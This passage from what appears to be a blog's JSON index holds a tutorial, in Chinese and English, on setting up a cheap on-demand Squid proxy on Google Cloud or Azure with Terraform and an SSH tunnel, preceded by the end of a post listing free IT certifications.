整合 Google 支持的认证 缺点： 非监考 仅限于教育部门 认证 免费 续约 不适用 价值 ⭐⭐ 在线营销 💰 SkillShop 上的 Google SkillShop 上的 Google 免费证书是由 Google 设计并在在线学习平台 SkillShop 上提供的一系列认证。这些认证展示了您在与 Google 产品和技术相关的特定领域的知识和技能，例如数字分析、广告和数据可视化。培训资源是免费的。尽管您学习的知识与 Google 的产品相关，但它仍然提供了一个很好的机会来了解这些产品如何利用人工智能。 https://skillshop.exceedlms.com/ 优点： 100% 免费 超过 20 个证书 公司知名度高 缺点： 在线测验 知识与 Google 的产品相关 认证 免费 续约 1 年 价值 ⭐⭐ 摘要 类别 名称 考试 认证 续约 价值 网络安全 ISC2 网络安全认证 (CC) 免费 每年 50 美元 每年 50 美元 ⭐⭐⭐⭐ 网络安全 Cisco 道德黑客 免费 免费 不适用 ⭐⭐⭐⭐ DevOps GitLab 认证助理 免费 免费 3 年 ⭐⭐⭐ DevOps GitLab 大学课程 免费 免费 不适用 ⭐⭐ 数据库 Neo4j 认证 免费 免费 不适用 ⭐⭐ SRE New Relic 验证基础 免费 免费 不适用 ⭐⭐ 云端 Google Cloud 免费 免费 2 年 ⭐⭐⭐⭐ 教育 Google 教育版 免费 免费 不适用 ⭐⭐ 营销 Google 广告 免费 免费 1 年 ⭐⭐ 项目管理 六西格玛白带 免费 免费 永不过期 ⭐ 还有其他维护免费 IT 证书清单的存储库： https://github.com/cloudcommunity/Free-Certifications","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/tags/Cybersecurity/"}],"lang":"zh-CN"},{"title":"管理您自己的 VPN - 省錢達人指南","slug":"2024/01/Manage_Your_Own_VPN_A_Penny-Pinchers_Guide-zh-TW","date":"un55fin55","updated":"un22fin22","comments":true,"path":"/zh-TW/2024/01/Manage_Your_Own_VPN_A_Penny-Pinchers_Guide/","permalink":"https://neo01.com/zh-TW/2024/01/Manage_Your_Own_VPN_A_Penny-Pinchers_Guide/","excerpt":"拋棄 VPN 訂閱，開始像數位遊牧民族一樣生活 - 減去 Instagram 上值得拍照的咖啡店氛圍。只需使用按需付費的雲端 VPN 即可（您的錢包會感謝您）！","text":"啊，網際網路 - 一個充滿知識和貓咪影片的廣闊空間。但當您在這個數位海洋中航行時，您可能會發現自己想要更多隱私，或者您只是厭倦了根據您的位置被告知可以和不可以查看什麼內容… VPN 和代理服務定價模式的問題 讓我們快速看一下截至 2025 年 10 月的 VPN 服務價格 VPN 提供商 每月價格（美元） 訂閱每月價格（美元） Surfshark（入門版） $15.45 2 年訂閱 $1.99 ExpressVPN（基本版） $12.99 2 年訂閱 $3.49 最好的按需付費選項是按月計費。按使用量付費的模式不存在，我們被迫採用基於訂閱的模式。基於訂閱的模式就像僱用一個堅持簽訂一年合約的保鑣，而您只需要有人在每月一次的可疑回家路上保護您。像我這樣的省錢達人不接受這種訂閱優惠。 按需雲端代理 現在，讓我們檢視可用於您的 VPN/代理冒險的雲端服務。您可以在雲端上建立 VPN/代理伺服器。為簡單起見，讓我們從 Google Cloud 上的代理伺服器開始。以下是它的工作原理： flowchart LR pc[\"您的電腦\\n在國家 A\\n\\n\"] ssh[\"SSH 通道\\n\\n\"] pc-->ssh proxy[\"Google Cloud 上的代理\\n在國家 B\\n\\n\"] ssh-->proxy target[\"目標網站\\n\\n\"] proxy-->target 流程圖說明了在 Google Cloud 上設定代理伺服器。您的電腦（PC）在國家 A，您想存取受限制或因您的位置而被封鎖內容的目標網站（target）。您從電腦建立 SSH 通道（ssh）到 Google Cloud 上的代理伺服器（proxy），該伺服器位於國家 B。這允許您繞過地理限制並存取目標網站，就像您在國家 B 一樣。 提供商 1. Google Cloud 以下是在 Google Cloud 上建立帶有代理（squid）的運算引擎的 Terraform 腳本。 main.tfresource &quot;google_compute_instance&quot; &quot;default&quot; &#123; name &#x3D; &quot;proxy-server&quot; machine_type &#x3D; &quot;e2-micro&quot; zone &#x3D; &quot;us-west1-a&quot; tags &#x3D; [&quot;ssh&quot;] scheduling &#123; provisioning_model &#x3D; &quot;SPOT&quot; automatic_restart &#x3D; false preemptible &#x3D; true &#125; boot_disk &#123; initialize_params &#123; image &#x3D; &quot;ubuntu-os-cloud&#x2F;ubuntu-2004-lts&quot; &#125; &#125; network_interface &#123; network &#x3D; &quot;default&quot; access_config &#123; &#x2F;&#x2F; Ephemeral public IP network_tier &#x3D; &quot;STANDARD&quot; &#125; &#125; service_account &#123; scopes &#x3D; [&quot;cloud-platform&quot;] &#125; metadata &#x3D; &#123; ssh-keys &#x3D; format(&quot;%s:%s&quot;, var.ssh_username, var.ssh_public_key) startup-script &#x3D; &quot;sudo apt-get update;sudo apt-get install -y squid;sudo systemctl start squid&quot; &#125; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/google/main.tf variables.tfvariable &quot;ssh_username&quot; &#123; type &#x3D; string description &#x3D; &quot;username of SSH to the compute engine&quot; &#125; variable &quot;ssh_public_key&quot; &#123; type &#x3D; string description &#x3D; &quot;Public key for SSH&quot; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/google/variables.tf output.tfoutput &quot;ip&quot; &#123; value &#x3D; google_compute_instance.default.network_interface.0.access_config.0.nat_ip &#125; output &quot;command&quot; &#123; description &#x3D; &quot;Command to setup ssh tunnel to the proxy server&quot; value &#x3D; format(&quot;ssh-keygen -R %s; ssh -L3128:localhost:3128 %s@%s&quot;, google_compute_instance.default.network_interface.0.access_config.0.nat_ip, var.ssh_username, google_compute_instance.default.network_interface.0.access_config.0.nat_ip) &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/google/output.tf 執行 terraform apply： $ terraform apply var.google_access_credentials The json file that contains key of your service account in Google Cloud Enter a value: a.josn var.project Google Cloud Project Name Enter a value: a var.ssh_public_key Public key for SSH Enter a value: ssh-rsa AAAAB... var.ssh_username username of SSH to the compute engine Enter a value: neo Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols: + create Terraform will perform the following actions: # google_compute_instance.default will be created + resource &quot;google_compute_instance&quot; &quot;default&quot; &#123; ... + machine_type &#x3D; &quot;e2-micro&quot; + metadata &#x3D; &#123; + &quot;ssh-keys&quot; &#x3D; &quot;neo:ssh-rsa AAAAB...&quot; + &quot;startup-script&quot; &#x3D; &quot;sudo apt-get update;sudo apt-get install -y squid;sudo systemctl start squid&quot; &#125; ... &#125; Plan: 1 to add, 0 to change, 0 to destroy. Changes to Outputs: + command &#x3D; (known after apply) + ip &#x3D; (known after apply) Do you want to perform these actions? Terraform will perform the actions described above. Only &#39;yes&#39; will be accepted to approve. Enter a value: yes google_compute_instance.default: Creating... google_compute_instance.default: Still creating... [10s elapsed] google_compute_instance.default: Creation complete after 17s [id&#x3D;projects&#x2F;a&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server] Apply complete! Resources: 1 added, 0 changed, 0 destroyed. Outputs: command &#x3D; &quot;ssh -L3128:localhost:3128 neo@123.123.123.123&quot; ip &#x3D; &quot;123.123.123.123&quot; 要設定到代理的 SSH 通道，請使用輸出 command 中提供的命令。您可能需要等待片刻，直到代理準備就緒。一旦代理準備就緒，您的瀏覽器就可以使用 localhost:3128 作為代理。 當雲端服務重複使用 IP 位址來建立新的運算實例時，如果您之前曾 SSH 到該 IP 位址，您可能會遇到主機驗證錯誤。這是因為新的運算實例生成了新的主機金鑰，該金鑰與您在 .ssh/known_hosts 中信任的金鑰不符。要解決此問題，您可以使用 ssh-keygen -R 刪除受信任的主機金鑰，或將私鑰從本機發送到新的運算實例。 完成後記得銷毀運算引擎： $ terraform destroy google_compute_instance.default: Refreshing state... [id&#x3D;projects&#x2F;f-01man-com&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server] Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols: - destroy Terraform will perform the following actions: # google_compute_instance.default will be destroyed - resource &quot;google_compute_instance&quot; &quot;default&quot; &#123; ... &#125; Plan: 0 to add, 0 to change, 1 to destroy. Do you really want to destroy all resources? Terraform will destroy all your managed infrastructure, as shown above. There is no undo. Only &#39;yes&#39; will be accepted to confirm. Enter a value: yes google_compute_instance.default: Destroying... [id&#x3D;projects&#x2F;a&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server] google_compute_instance.default: Still destroying... [id&#x3D;projects&#x2F;a&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server, 10s elapsed] google_compute_instance.default: Destruction complete after 16s Destroy complete! Resources: 1 destroyed. 鑑於我的使用量極低，例如每月 30 分鐘，Google 每月向我收取約 0.20 美元。然而，這並不能阻止我探索其他更便宜的替代方案。 提供商 2. Azure main.tfresource &quot;azurerm_resource_group&quot; &quot;rg&quot; &#123; name &#x3D; &quot;squid-rg&quot; location &#x3D; &quot;West US&quot; &#125; resource &quot;azurerm_virtual_machine&quot; &quot;proxy&quot; &#123; name &#x3D; &quot;squid-proxy-vm&quot; # charge you if you dont delete delete_data_disks_on_termination &#x3D; true delete_os_disk_on_termination &#x3D; true resource_group_name &#x3D; azurerm_resource_group.rg.name location &#x3D; azurerm_resource_group.rg.location network_interface_ids &#x3D; [azurerm_network_interface.nic.id] vm_size &#x3D; &quot;Standard_B1s&quot; storage_os_disk &#123; name &#x3D; &quot;os&quot; caching &#x3D; &quot;ReadWrite&quot; managed_disk_type &#x3D; &quot;Standard_LRS&quot; create_option &#x3D; &quot;FromImage&quot; os_type &#x3D; &quot;Linux&quot; &#125; storage_image_reference &#123; publisher &#x3D; &quot;Canonical&quot; offer &#x3D; &quot;0001-com-ubuntu-server-jammy&quot; sku &#x3D; &quot;22_04-lts&quot; version &#x3D; &quot;latest&quot; &#125; os_profile &#123; admin_username &#x3D; var.ssh_username computer_name &#x3D; &quot;proxy&quot; custom_data &#x3D; base64encode(&lt;&lt;CUSTOM_DATA #!&#x2F;bin&#x2F;bash sudo apt-get update;sudo apt-get install -y squid;sudo systemctl start squid CUSTOM_DATA ) &#125; os_profile_linux_config &#123; disable_password_authentication &#x3D; true ssh_keys &#123; path &#x3D; &quot;&#x2F;home&#x2F;$&#123;var.ssh_username&#125;&#x2F;.ssh&#x2F;authorized_keys&quot; key_data &#x3D; var.ssh_public_key &#125; &#125; &#125; resource &quot;azurerm_network_interface&quot; &quot;nic&quot; &#123; name &#x3D; &quot;squid-nic&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name location &#x3D; azurerm_resource_group.rg.location ip_configuration &#123; name &#x3D; &quot;squid-ipconfig&quot; subnet_id &#x3D; azurerm_subnet.subnet.id private_ip_address_allocation &#x3D; &quot;Dynamic&quot; public_ip_address_id &#x3D; azurerm_public_ip.proxy.id &#125; &#125; resource &quot;azurerm_subnet&quot; &quot;subnet&quot; &#123; name &#x3D; &quot;squid-subnet&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name virtual_network_name &#x3D; azurerm_virtual_network.vnet.name address_prefixes &#x3D; [&quot;10.0.0.0&#x2F;24&quot;] &#125; resource &quot;azurerm_virtual_network&quot; &quot;vnet&quot; &#123; name &#x3D; &quot;squid-vnet&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name address_space &#x3D; [&quot;10.0.0.0&#x2F;8&quot;] location &#x3D; &quot;West US&quot; &#125; resource &quot;azurerm_public_ip&quot; &quot;proxy&quot; &#123; name &#x3D; &quot;squidPublicIp1&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name location &#x3D; azurerm_resource_group.rg.location allocation_method &#x3D; &quot;Static&quot; lifecycle &#123; create_before_destroy &#x3D; true &#125; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/azure/main.tf variables.tfvariable &quot;ssh_username&quot; &#123; type &#x3D; string description &#x3D; &quot;username of SSH to the compute engine&quot; &#125; variable &quot;ssh_public_key&quot; &#123; type &#x3D; string description &#x3D; &quot;Public key for SSH&quot; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/azure/variables.tf output.tfoutput &quot;ip&quot; &#123; value &#x3D; azurerm_public_ip.proxy.ip_address &#125; output &quot;command&quot; &#123; description &#x3D; &quot;Command to setup ssh tunnel to the proxy server&quot; value &#x3D; format(&quot;ssh-keygen -R %s; ssh -L3128:localhost:3128 %s@%s&quot;, azurerm_public_ip.proxy.ip_address, var.ssh_username, azurerm_public_ip.proxy.ip_address) &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/azure/output.tf 建立和銷毀需要時間。您可以檢查 /var/log/cloud-init.log 並尋找 subp.py 和 part 來進行故障排除，例如： 2024-05-07 14:14:02,864 - subp.py[DEBUG]: Running command [&#39;&#x2F;var&#x2F;lib&#x2F;cloud&#x2F;instance&#x2F;scripts&#x2F;part-001&#39;] with allowed return codes [0] (shell&#x3D;False, capture&#x3D;False) 2024-05-07 14:14:02,864 - subp.py[DEBUG]: Exec format error. Missing #! in script? Command: [&#39;&#x2F;var&#x2F;lib&#x2F;cloud&#x2F;instance&#x2F;scripts&#x2F;part-001&#39;] Exit code: - Reason: [Errno 8] Exec format error: b&#39;&#x2F;var&#x2F;lib&#x2F;cloud&#x2F;instance&#x2F;scripts&#x2F;part-001&#39; 其他雲端服務提供商 我也嘗試過阿里雲和華為雲。然而，阿里雲在使用來自中國以外國家的 IP 位址和資源幾次後需要帳戶驗證，要求我上傳護照等。此外，最低運算服務是按月計費，而不是像 Google Cloud 那樣基於消費。 另一方面，華為雲更好；運算服務可以基於消費。然而，頻寬費用是按日訂閱而不是計量，導致每日費用為 2 美元！因此，我不建議省錢達人使用阿里雲和華為雲。 雲端不可知 Terraform 腳本 現在我們有 2 個雲端提供商選項，Azure 和 Google。我們想建立雲端不可知的 Terraform 腳本，因為它允許我們維護一組程式碼並將其應用於多個雲端提供商。這種方法允許我們在需要時輕鬆切換不同的雲端服務提供商。雲端不可知架構加上省錢！ 讓我們將資料夾結構如下： \\ - root \\ - main.tf - variables.tf - output.tf - provider.tf \\ - modules \\ - google \\ - main.tf - variables.tf - output.tf \\ - azure \\ - main.tf - variables.tf - output.tf root 資料夾作為雲端不可知的抽象層，而 modules 下的子資料夾，即 modules/azure 和 modules/google，作為雲端特定的實作。您可以期望從執行 root 腳本中透過提供您的使用者名稱和公鑰來配置雲端伺服器，並從輸出返回設定 SSH 通道的命令。使用哪個提供商取決於 cloud_service_provider 變數，從範例中可以是 azure 或 google。 /variables.tfvariable &quot;cloud_service_provider&quot; &#123; type &#x3D; string description &#x3D; &quot;Cloud Service Provider: azure or google&quot; validation &#123; condition &#x3D; contains([&quot;azure&quot;, &quot;google&quot;], var.cloud_service_provider) error_message &#x3D; &quot;Valid values for var: cloud_service_provider are (azure, google).&quot; &#125; &#125; variable &quot;ssh_username&quot; &#123; type &#x3D; string description &#x3D; &quot;username of SSH to the compute engine&quot; &#125; variable &quot;ssh_public_key&quot; &#123; type &#x3D; string description &#x3D; &quot;Public key for SSH&quot; &#125; variable &quot;google_project&quot; &#123; type &#x3D; string default &#x3D; &quot;no project&quot; description &#x3D; &quot;Google Cloud Project Name.&quot; &#125; locals &#123; # cross variables validation could be improved in Terraform v1.9.0 # tflint-ignore: terraform_unused_declarations validate_project &#x3D; (var.google_project &#x3D;&#x3D; &quot;no project&quot; &amp;&amp; var.cloud_service_provider &#x3D;&#x3D; &quot;google&quot;) ? tobool( &quot;google_project must be provided when the provider is &#39;google&#39;.&quot;) : true &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/variables.tf /main.tf 非常簡單，它根據需求啟用模組來實作雲端代理並停用其他模組： /main.tfmodule &quot;azure_server&quot; &#123; source &#x3D; &quot;.&#x2F;modules&#x2F;azure&quot; count &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;azure&quot;) ? 1 : 0 ssh_public_key &#x3D; var.ssh_public_key ssh_username &#x3D; var.ssh_username &#125; module &quot;google_server&quot; &#123; source &#x3D; &quot;.&#x2F;modules&#x2F;google&quot; count &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;google&quot;) ? 1 : 0 ssh_public_key &#x3D; var.ssh_public_key ssh_username &#x3D; var.ssh_username &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/main.tf /output.tf 與 /main.tf 類似，它也返回 ip 和 command： /output.tfoutput &quot;ip&quot; &#123; value &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;azure&quot;) ? module.azure_server[0].ip : module.google_server[0].ip &#125; output &quot;command&quot; &#123; description &#x3D; &quot;Command to setup ssh tunnel to the proxy server&quot; value &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;azure&quot;) ? module.azure_server[0].command : module.google_server[0].command &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/output.tf Terraform 腳本中的提供商從模組中刪除並放在一起到 /provider.tf 中。 /provider.tfterraform &#123; required_providers &#123; azapi &#x3D; &#123; source &#x3D; &quot;Azure&#x2F;azapi&quot; &#125; azurerm &#x3D; &#123; source &#x3D; &quot;hashicorp&#x2F;azurerm&quot; &#125; google &#x3D; &#123; source &#x3D; &quot;hashicorp&#x2F;google&quot; &#125; &#125; &#125; provider &quot;azapi&quot; &#123; &#125; provider &quot;azurerm&quot; &#123; features &#123;&#125; &#125; provider &quot;google&quot; &#123; project &#x3D; var.google_project region &#x3D; &quot;us-central1&quot; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/provider.tf 完整原始碼：https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/ 📖 neoalienson/cloud_vpn_proxy Setup your own Cloud Agnostic cloud VPN or proxy ⭐ 0 Stars 🍴 0 Forks Language: HCL 代理就緒通知 即將推出… 價格比較 Azure 虛擬機器 虛擬網路 儲存 頻寬 Google Cloud 運算引擎 網路 即將推出… 使用 WireGuard 的 VPN 即將推出… 使用者友善的開關 即將推出… 關閉提醒 即將推出…","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Google","slug":"Google","permalink":"https://neo01.com/tags/Google/"},{"name":"cloud","slug":"cloud","permalink":"https://neo01.com/tags/cloud/"},{"name":"Azure","slug":"Azure","permalink":"https://neo01.com/tags/Azure/"},{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}],"lang":"zh-TW"},{"title":"Manage Your Own VPN - A Penny-Pincher's Guide","slug":"2024/01/Manage_Your_Own_VPN_A_Penny-Pinchers_Guide","date":"un55fin55","updated":"un22fin22","comments":true,"path":"2024/01/Manage_Your_Own_VPN_A_Penny-Pinchers_Guide/","permalink":"https://neo01.com/2024/01/Manage_Your_Own_VPN_A_Penny-Pinchers_Guide/","excerpt":"Ditch the VPN subscription and start living like a digital nomad - minus the Instagram-worthy coffee shop vibes. Just grab a pay-as-you-go cloud VPN and wing it (your wallet will thank you)!","text":"Ah, the internet – a vast expanse of knowledge and cat videos. But as you navigate this digital sea, you might find yourself wanting a bit more privacy, or perhaps you’re just tired of being told what content you can and cannot view based on your location… Problem with VPN and Proxy Service Pricing Model Let’s have a quick look at the VPN service price as of Oct 2025 VPN Provider Price per month (USD) Price with subscription per month (USD) Surfshark (Starter) $15.45 $1.99 for 2 years subscription ExpressVPN (Basic) $12.99 3.49 for 2 years subscription The best pay-as-you-go option is per month. Per usage pay-as-you-go model does not exist and we are forced to adopt a subscription-based model. A subscription-based model is like hiring a bodyguard who insists on a year-long contract when you only need someone to watch your back during that shady walk home once a month. A Penny Pincher like me does not accept this subscription offer. On Demand Cloud Proxy Now, let us examine the available cloud services for your VPN/proxy adventures. You can create a VPN/proxy server on Cloud. For simplicity, let’s start with a proxy server on Google Cloud. Here’s how it is going to work: flowchart LR pc[\"Your PC\\nin Country A\\n\\n\"] ssh[\"SSH tunnel\\n\\n\"] pc-->ssh proxy[\"Proxy on Google Cloud\\nin Country B\\n\\n\"] ssh-->proxy target[\"Target Website\\n\\n\"] proxy-->target The flowchart illustrates the setup of a proxy server on Google Cloud. Your PC (PC) is in Country A, and you want to access a target website (target) that is restricted or has content blocked by your location. You establish an SSH tunnel (ssh) from your PC to the proxy server (proxy) on Google Cloud, which is located in Country B. This allows you to bypass geographical restrictions and access the target website as if you were in Country B. Provider 1. Google Cloud Below are the Terraform scripts to create a compute engine with the proxy (squid) on Google Cloud. main.tfresource &quot;google_compute_instance&quot; &quot;default&quot; &#123; name &#x3D; &quot;proxy-server&quot; machine_type &#x3D; &quot;e2-micro&quot; zone &#x3D; &quot;us-west1-a&quot; tags &#x3D; [&quot;ssh&quot;] scheduling &#123; provisioning_model &#x3D; &quot;SPOT&quot; automatic_restart &#x3D; false preemptible &#x3D; true &#125; boot_disk &#123; initialize_params &#123; image &#x3D; &quot;ubuntu-os-cloud&#x2F;ubuntu-2004-lts&quot; &#125; &#125; network_interface &#123; network &#x3D; &quot;default&quot; access_config &#123; &#x2F;&#x2F; Ephemeral public IP network_tier &#x3D; &quot;STANDARD&quot; &#125; &#125; service_account &#123; scopes &#x3D; [&quot;cloud-platform&quot;] &#125; metadata &#x3D; &#123; ssh-keys &#x3D; format(&quot;%s:%s&quot;, var.ssh_username, var.ssh_public_key) startup-script &#x3D; &quot;sudo apt-get update;sudo apt-get install -y squid;sudo systemctl start squid&quot; &#125; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/google/main.tf variables.tfvariable &quot;ssh_username&quot; &#123; type &#x3D; string description &#x3D; &quot;username of SSH to the compute engine&quot; &#125; variable &quot;ssh_public_key&quot; &#123; type &#x3D; string description &#x3D; &quot;Public key for SSH&quot; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/google/variables.tf output.tfoutput &quot;ip&quot; &#123; value &#x3D; google_compute_instance.default.network_interface.0.access_config.0.nat_ip &#125; output &quot;command&quot; &#123; description &#x3D; &quot;Command to setup ssh tunnel to the proxy server&quot; value &#x3D; format(&quot;ssh-keygen -R %s; ssh -L3128:localhost:3128 %s@%s&quot;, google_compute_instance.default.network_interface.0.access_config.0.nat_ip, var.ssh_username, google_compute_instance.default.network_interface.0.access_config.0.nat_ip) &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/google/output.tf Run terraform apply: $ terraform apply var.google_access_credentials The json file that contains key of your service account in Google Cloud Enter a value: a.josn var.project Google Cloud Project Name Enter a value: a var.ssh_public_key Public key for SSH Enter a value: ssh-rsa AAAAB... var.ssh_username username of SSH to the compute engine Enter a value: neo Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols: + create Terraform will perform the following actions: # google_compute_instance.default will be created + resource &quot;google_compute_instance&quot; &quot;default&quot; &#123; ... + machine_type &#x3D; &quot;e2-micro&quot; + metadata &#x3D; &#123; + &quot;ssh-keys&quot; &#x3D; &quot;neo:ssh-rsa AAAAB...&quot; + &quot;startup-script&quot; &#x3D; &quot;sudo apt-get update;sudo apt-get install -y squid;sudo systemctl start squid&quot; &#125; ... &#125; Plan: 1 to add, 0 to change, 0 to destroy. Changes to Outputs: + command &#x3D; (known after apply) + ip &#x3D; (known after apply) Do you want to perform these actions? Terraform will perform the actions described above. Only &#39;yes&#39; will be accepted to approve. Enter a value: yes google_compute_instance.default: Creating... google_compute_instance.default: Still creating... [10s elapsed] google_compute_instance.default: Creation complete after 17s [id&#x3D;projects&#x2F;a&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server] Apply complete! Resources: 1 added, 0 changed, 0 destroyed. Outputs: command &#x3D; &quot;ssh -L3128:localhost:3128 neo@123.123.123.123&quot; ip &#x3D; &quot;123.123.123.123&quot; To set up an SSH tunnel to the proxy, use the command provided in the output command. You may need to wait a few moments until the proxy is ready. Once the proxy is ready, your browser can use localhost:3128 as the proxy. When a cloud service reuses an IP address to create a new compute instance, you may experience a host validation error if you had SSH to the IP address before. This occurs because the new compute instance generates a new host key, which does not match the key you trusted in .ssh/known_hosts. To resolve this issue, you can either remove the trusted host key using ssh-keygen -R or send the private key from your local machine to the new compute instance. Remember to destroy the compute engine once you have finished with it: $ terraform destroy google_compute_instance.default: Refreshing state... [id&#x3D;projects&#x2F;f-01man-com&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server] Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols: - destroy Terraform will perform the following actions: # google_compute_instance.default will be destroyed - resource &quot;google_compute_instance&quot; &quot;default&quot; &#123; ... &#125; Plan: 0 to add, 0 to change, 1 to destroy. Do you really want to destroy all resources? Terraform will destroy all your managed infrastructure, as shown above. There is no undo. Only &#39;yes&#39; will be accepted to confirm. Enter a value: yes google_compute_instance.default: Destroying... [id&#x3D;projects&#x2F;a&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server] google_compute_instance.default: Still destroying... [id&#x3D;projects&#x2F;a&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server, 10s elapsed] google_compute_instance.default: Destruction complete after 16s Destroy complete! Resources: 1 destroyed. Given my extremely low usage, like 30 minutes a month, Google charges me around USD $0.20 a month. However, that doesn’t stop me from exploring other cheaper alternatives. Provider 2. Azure main.tfresource &quot;azurerm_resource_group&quot; &quot;rg&quot; &#123; name &#x3D; &quot;squid-rg&quot; location &#x3D; &quot;West US&quot; &#125; resource &quot;azurerm_virtual_machine&quot; &quot;proxy&quot; &#123; name &#x3D; &quot;squid-proxy-vm&quot; # charge you if you dont delete delete_data_disks_on_termination &#x3D; true delete_os_disk_on_termination &#x3D; true resource_group_name &#x3D; azurerm_resource_group.rg.name location &#x3D; azurerm_resource_group.rg.location network_interface_ids &#x3D; [azurerm_network_interface.nic.id] vm_size &#x3D; &quot;Standard_B1s&quot; storage_os_disk &#123; name &#x3D; &quot;os&quot; caching &#x3D; &quot;ReadWrite&quot; managed_disk_type &#x3D; &quot;Standard_LRS&quot; create_option &#x3D; &quot;FromImage&quot; os_type &#x3D; &quot;Linux&quot; &#125; storage_image_reference &#123; publisher &#x3D; &quot;Canonical&quot; offer &#x3D; &quot;0001-com-ubuntu-server-jammy&quot; sku &#x3D; &quot;22_04-lts&quot; version &#x3D; &quot;latest&quot; &#125; os_profile &#123; admin_username &#x3D; var.ssh_username computer_name &#x3D; &quot;proxy&quot; custom_data &#x3D; base64encode(&lt;&lt;CUSTOM_DATA #!&#x2F;bin&#x2F;bash sudo apt-get update;sudo apt-get install -y squid;sudo systemctl start squid CUSTOM_DATA ) &#125; os_profile_linux_config &#123; disable_password_authentication &#x3D; true ssh_keys &#123; path &#x3D; &quot;&#x2F;home&#x2F;$&#123;var.ssh_username&#125;&#x2F;.ssh&#x2F;authorized_keys&quot; key_data &#x3D; var.ssh_public_key &#125; &#125; &#125; resource &quot;azurerm_network_interface&quot; &quot;nic&quot; &#123; name &#x3D; &quot;squid-nic&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name location &#x3D; azurerm_resource_group.rg.location ip_configuration &#123; name &#x3D; &quot;squid-ipconfig&quot; subnet_id &#x3D; azurerm_subnet.subnet.id private_ip_address_allocation &#x3D; &quot;Dynamic&quot; public_ip_address_id &#x3D; azurerm_public_ip.proxy.id &#125; &#125; resource &quot;azurerm_subnet&quot; &quot;subnet&quot; &#123; name &#x3D; &quot;squid-subnet&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name virtual_network_name &#x3D; azurerm_virtual_network.vnet.name address_prefixes &#x3D; [&quot;10.0.0.0&#x2F;24&quot;] &#125; resource &quot;azurerm_virtual_network&quot; &quot;vnet&quot; &#123; name &#x3D; &quot;squid-vnet&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name address_space &#x3D; [&quot;10.0.0.0&#x2F;8&quot;] location &#x3D; &quot;West US&quot; &#125; resource &quot;azurerm_public_ip&quot; &quot;proxy&quot; &#123; name &#x3D; &quot;squidPublicIp1&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name location &#x3D; azurerm_resource_group.rg.location allocation_method &#x3D; &quot;Static&quot; lifecycle &#123; create_before_destroy &#x3D; true &#125; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/azure/main.tf variables.tfvariable &quot;ssh_username&quot; &#123; type &#x3D; string description &#x3D; &quot;username of SSH to the compute engine&quot; &#125; variable &quot;ssh_public_key&quot; &#123; type &#x3D; string description &#x3D; &quot;Public key for SSH&quot; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/azure/variables.tf output.tfoutput &quot;ip&quot; &#123; value &#x3D; azurerm_public_ip.proxy.ip_address &#125; output &quot;command&quot; &#123; description &#x3D; &quot;Command to setup ssh tunnel to the proxy server&quot; value &#x3D; format(&quot;ssh-keygen -R %s; ssh -L3128:localhost:3128 %s@%s&quot;, azurerm_public_ip.proxy.ip_address, var.ssh_username, azurerm_public_ip.proxy.ip_address) &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/azure/output.tf It takes time to create and destroy. You can check /var/log/cloud-init.log and look for subp.py and part to troubleshoot, e.g.: 2024-05-07 14:14:02,864 - subp.py[DEBUG]: Running command [&#39;&#x2F;var&#x2F;lib&#x2F;cloud&#x2F;instance&#x2F;scripts&#x2F;part-001&#39;] with allowed return codes [0] (shell&#x3D;False, capture&#x3D;False) 2024-05-07 14:14:02,864 - subp.py[DEBUG]: Exec format error. Missing #! in script? Command: [&#39;&#x2F;var&#x2F;lib&#x2F;cloud&#x2F;instance&#x2F;scripts&#x2F;part-001&#39;] Exit code: - Reason: [Errno 8] Exec format error: b&#39;&#x2F;var&#x2F;lib&#x2F;cloud&#x2F;instance&#x2F;scripts&#x2F;part-001&#39; Other Cloud Service Provider I have also tried Alibaba 